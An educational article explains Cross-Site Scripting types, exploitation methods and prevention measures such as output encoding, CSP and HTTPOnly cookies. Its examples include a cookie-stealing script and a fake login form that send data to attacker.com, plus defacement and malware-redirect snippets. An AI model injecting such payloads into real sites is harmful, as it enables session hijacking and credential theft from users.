Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to various attacks, including data theft, session hijacking, and defacement of websites. XSS exploits the trust a user has in a particular website, allowing the attacker to execute scripts in the context of the user's browser.

### Types of XSS

1. **Stored XSS (Persistent XSS)**:
   - In this type, the malicious script is stored on the server (e.g., in a database) and is served to users when they access the affected page.
   - **Example**: An attacker submits a comment containing a malicious script on a blog. When other users view the blog, the script executes in their browsers.

2. **Reflected XSS (Non-Persistent XSS)**:
   - The malicious script is reflected off a web server, typically via a URL or a form submission. The script is executed immediately without being stored.
   - **Example**: An attacker crafts a URL that includes a malicious script as a query parameter. When a victim clicks the link, the server reflects the script back in the response, executing it in the victim's browser.

3. **DOM-based XSS**:
   - This type occurs when the client-side scripts modify the Document Object Model (DOM) in a way that allows the execution of malicious scripts. The attack does not involve the server.
   - **Example**: A web application uses JavaScript to read data from the URL and inject it into the page without proper sanitization, allowing an attacker to manipulate the URL to execute a script.

### Exploitation Methods

Attackers can exploit XSS vulnerabilities using various methods:

1. **Session Hijacking**:
   - By injecting a script that captures cookies or session tokens, an attacker can impersonate a user. For example, the script can send the captured data to the attacker's server.

   ```javascript
   <script>
       var img = new Image();
       img.src = "http://attacker.com/steal?cookie=" + document.cookie;
   </script>
   ```

2. **Phishing**:
   - An attacker can create a fake login form that appears on a legitimate site. When users enter their credentials, the attacker captures them.

   ```html
   <form action="http://attacker.com/steal" method="POST">
       <input type="text" name="username" placeholder="Username">
       <input type="password" name="password" placeholder="Password">
       <input type="submit" value="Login">
   </form>
   ```

3. **Defacement**:
   - Attackers can inject scripts that modify the content of a webpage, displaying their own messages or images.

   ```javascript
   <script>
       document.body.innerHTML = "<h1>Hacked by Attacker</h1>";
   </script>
   ```

4. **Malware Distribution**:
   - An attacker can use XSS to redirect users to malicious sites or download malware.

   ```javascript
   <script>
       window.location.href = "http://malicious-site.com/malware.exe";
   </script>
   ```

### Prevention Measures

To protect against XSS vulnerabilities, developers should implement the following strategies:

1. **Input Validation and Sanitization**:
   - Validate and sanitize all user inputs to ensure they do not contain malicious scripts. Use libraries or frameworks that provide built-in protection against XSS.

2. **Output Encoding**:
   - Encode data before rendering it in the browser. This ensures that any potentially harmful characters are treated as plain text rather than executable code.

3. **Content Security Policy (CSP)**:
   - Implement a CSP to restrict the sources from which scripts can be loaded. This can help mitigate the impact of XSS attacks.

4. **Use HTTPOnly and Secure Flags**:
   - Set the `HTTPOnly` flag on cookies to prevent JavaScript from accessing them. Use the `Secure` flag to ensure cookies are only sent over HTTPS.

5. **Regular Security Audits**:
   - Conduct regular security assessments and code reviews to identify and remediate XSS vulnerabilities.

### Conclusion

Cross-Site Scripting (XSS) is a prevalent and dangerous vulnerability that can lead to significant security breaches. Understanding the types of XSS and the methods of exploitation is crucial for developers and security professionals. By implementing robust security measures, organizations can protect their applications and users from XSS attacks.